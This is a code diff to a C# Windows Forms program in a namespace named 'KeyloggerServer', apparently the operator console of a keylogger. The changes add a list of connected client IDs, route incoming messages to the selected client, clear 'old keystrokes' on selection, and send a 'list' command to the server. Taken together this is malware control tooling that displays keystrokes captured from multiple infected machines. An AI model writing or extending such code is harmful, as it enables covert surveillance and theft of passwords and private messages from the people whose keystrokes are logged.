@@ -1,5 +1,6 @@
 using System;
 using System.Net;
+using System.Net.Http;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
@@ -12,6 +13,7 @@ namespace KeyloggerServer
         private TcpClient _client;
         private NetworkStream _stream;
         private CancellationTokenSource _cts;
+        private string currentlySelectedClientId = null;
         public Form1()
         {
             InitializeComponent();
@@ -52,8 +54,22 @@ namespace KeyloggerServer
                     int bytesRead = await _stream.ReadAsync(buffer, 0, buffer.Length, token);
                     if (bytesRead == 0) break; // disconnected
 
-                    string msg = Encoding.UTF8.GetString(buffer, 0, bytesRead);
-                    AppendMessage(msg);
+                    string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+                    if (message.StartsWith("[LIST]"))
+                    {
+                        string[] ids = message.Substring(6).Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
+                        UpdateClientList(ids);
+                    }
+                    else if (message.StartsWith("["))
+                    {
+                        int end = message.IndexOf(']');
+                        string clientId = message.Substring(1, end - 1);
+                        string content = message.Substring(end + 1);
+                       
+
+                        if (clientId == currentlySelectedClientId)
+                            AppendMessage(content);
+                    }
                 }
             }
             catch (OperationCanceledException)
@@ -101,5 +117,64 @@ namespace KeyloggerServer
                 buttonStop.Enabled = false;
             }
         }
+
+        private void UpdateClientList(string[] ids)
+        {
+            if (listViewClients.InvokeRequired)
+            {
+                listViewClients.Invoke(new Action(() => UpdateClientList(ids)));
+                return;
+            }
+
+            listViewClients.BeginUpdate();
+            listViewClients.Items.Clear();
+
+            foreach (var id in ids)
+            {
+                if (!string.IsNullOrWhiteSpace(id))
+                {
+                    listViewClients.Items.Add(new ListViewItem(id));
+                }
+            }
+
+            listViewClients.EndUpdate();
+        }
+
+        private void listViewClients_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            if (listViewClients.SelectedItems.Count > 0)
+            {
+                currentlySelectedClientId = listViewClients.SelectedItems[0].Text;
+                textBoxMessage.Clear(); // optional: clear old keystrokes
+            }
+            else
+            {
+                currentlySelectedClientId = null;
+            }
+        }
+
+        private async void buttonRefreshList_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (_stream == null || !_client.Connected)
+                {
+                    MessageBox.Show("Not connected to server.");
+                    return;
+                }
+
+                // Send "list" command to the server
+                byte[] commandBytes = Encoding.UTF8.GetBytes("list\n");
+                await _stream.WriteAsync(commandBytes, 0, commandBytes.Length);
+                await _stream.FlushAsync();
+
+                // Don't read response here — it will be handled in ListenLoop
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Failed to refresh list: {ex.Message}");
+            }
+        }
+
     }
 }
